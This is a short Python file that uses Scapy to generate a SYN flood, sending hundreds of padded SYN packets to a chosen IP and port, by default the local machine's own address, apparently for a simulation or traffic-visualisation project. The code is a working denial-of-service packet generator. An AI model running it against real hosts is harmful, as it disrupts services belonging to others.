from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort
from visualisation import get_local_ip


def simulate_syn_flood(interface, victim_ip=None, target_port=80, count=500, packet_size=1024):
    # Generate SYN Flood packets with a smaller Raw payload
    if not victim_ip:
        victim_ip = get_local_ip()

    ip_layer = IP(dst=victim_ip)
    tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw_payload = Raw(b"SYN_Flood_" + b"X" * (packet_size - 23))
    packet = ip_layer / tcp_layer / raw_payload

    for _ in range(count):
        send(packet, iface=interface, verbose=0)
